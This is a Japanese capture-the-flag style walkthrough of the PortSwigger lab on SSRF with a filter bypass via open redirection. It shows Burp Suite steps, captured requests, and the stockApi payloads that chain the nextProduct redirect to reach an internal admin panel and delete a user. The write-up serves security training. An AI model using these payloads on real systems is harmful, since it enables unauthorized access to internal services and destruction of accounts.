# オープン リダイレクトの脆弱性によるフィルター バイパスを伴う SSRF

以下のハッキングラボを実施します。  
https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection

- 1. Burp Suite を起動し、Proxy タブからブラウザを起動します
- 2. ブラウザからハッキングラボにアクセスします
- 3. 商品ページに移動し、Next product を押します

```
GET /product/nextProduct?currentProductId=2&path=/product?productId=3 HTTP/2
Host: 0a2f007603834554815b5367008000a9.web-security-academy.net
Cookie: session=5WpPOKsYUdUAbo9OAo2OBOl5dcoKxE1h; session=qv3Qx5IIT3CWCfjPPhqrS51gGRZp3lCn
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a2f007603834554815b5367008000a9.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
```

- 4. 上記リクエストを書き換えて、メモしておきます

```
GET /product/nextProduct?currentProductId=2&path=/product/nextProduct?path=http://192.168.0.12:8080/admin HTTP/2
```

- 5. 商品の在庫チェックボタンを押下します
- 6. POST /product/stock リクエストを Send to repeat します
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/9a4b522c-ac76-4700-9b8a-6242ada6bc51)

- 7. stockApi パラメータを以下のように書き換えて送信すると、ユーザー削除リンクの応答が得られます

```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

```html
<section>
  <h1>Users</h1>
  <div>
    <span>wiener - </span>
    <a href="/http://192.168.0.12:8080/admin/delete?username=wiener">Delete</a>
  </div>
  <div>
    <span>carlos - </span>
    <a href="/http://192.168.0.12:8080/admin/delete?username=carlos">Delete</a>
  </div>
</section>
```

- 8. stockApi パラメータをユーザ削除リンクに置き換えて再送すると、ユーザーの削除に成功します

```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```
